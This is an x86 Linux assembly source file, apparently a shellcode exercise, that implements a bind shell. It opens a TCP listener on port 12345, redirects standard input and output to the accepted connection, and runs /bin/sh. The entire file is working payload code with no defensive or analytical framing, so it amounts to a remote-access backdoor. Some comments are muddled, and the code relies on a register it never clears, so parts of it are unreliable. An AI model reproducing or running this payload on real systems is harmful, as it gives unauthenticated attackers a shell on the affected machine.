;Socket socket is created
;Bind	socket is bound to a local address using bind(2), so that other sockets may be connect(2)ed to it
;Listen	accept incoming connections
;Accept	Connections are accepted
;Dup2	handing over stdin,stdout,stderror 
;Execve	/bin/sh

global _start			

section .text
_start:
	;[ socketcall socket ]
	push 0x66		; syscall socketcall
	pop eax
	xor ebx, ebx		; clears ebx
	xor ecx, ecx		; clears ecx
	
	mov bl, 0x1		; ebx = 1	socket					;socket(int domain, int type, int protocol)

	push ecx		; socket option for IP {0}
	push ebx		; socket type to open tcp {SOCK_STREAM = 1}
	push byte 0x2		; Internet Ip Protocol {PF_INET = AF_INET = 2}

	mov ecx, esp

	int 0x80		; exec socket
	mov edi, eax		; contains file describter sockfd

;---------------------------------------------------------------------

	;[ socketcall Bind ]
	push 0x66		; syscall socketcall
	pop eax
	push 0x2
	pop ebx			; ebx = 2 bind						;bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)


	push esi		; IP to connect 0x0100007f
	push word 0x3930	; port for connect &  PF_INET = 2
	push word 2
	mov ecx,esp       	; hostaddr which is:
				; hostaddr.sin_family = PF_INET;
				; hostaddr.sin_port = 12345
				; hostaddr.sin_addr.s_addr =any
	push 16			; hostaddrlen = 0.0.0.0 (16 bits)			
	push ecx                ; addr to bind struct
	push edi                ; saved sockfd 
	mov ecx,esp             	
	
	int 0x80		; exec bind
	cmp eax, esi		; check if bind doesnt succeed, exit
	jne exit		

;---------------------------------------------------------------------

	;[ socketcall listen ]
	push 0x66		; syscall socketcall
	pop eax
	push 0x4
	pop ebx			; ebx = 4 listen					;listen(sockfd, backlog)

	push esi		; backlog =0
	push edi		; saved sockfd 
	mov ecx, esp
	int 0x80		; exec listen

;---------------------------------------------------------------------

	;[ socketcall accept ]
	push 0x66		; syscall socketcall
	pop eax
	push 0x5		
	pop ebx			; ebx = 5 accept					;accept(sockfd, struct sockaddr *addr, socklen_t *addrlen)

	push esi
	push esi
	push edi
	mov ecx, esp
	int 0x80

;---------------------------------------------------------------------

	mov ebx, eax		; save 	file descriptor(fd) for the accepted socket, and use it for dup2

	xor ecx, ecx		; clears ecx
	mov cl,0x2		; number of loop iteration
loop:
	mov al, 0x3f            ; syscall dup2	 dup2 (int oldfd , int newfd ) >> ebx=old, ecx=new
	int 0x80
	dec ecx                 ; decrement by 1
	jns loop

;---------------------------------------------------------------------

	;[ execve shell ]
	xor eax, eax
	cdq			; envp = 0
	mov al, 0xB             ; syscall execve
	push esi		; esi = 0
	push 0x68732f6e         ; n/sh 
	push 0x69622f2f         ; //bi
	mov ebx, esp            ; filename
	mov ecx, esi		; argv = 0
	int 0x80                ; exec execve



exit:
	push 4			
	pop eax	
	push 21
	pop edx
	push 1
	pop ebx
	push esi
	push 0x74656b63		; push error message
	push 0x6f532067
	push 0x6e69646e
	push 0x69422072
	push 0x6f727245
	mov ecx, esp
	int 0x80

	xor eax, eax		
	mov al, 1		; syscall exit
	int 0x80		; exits gracefuly


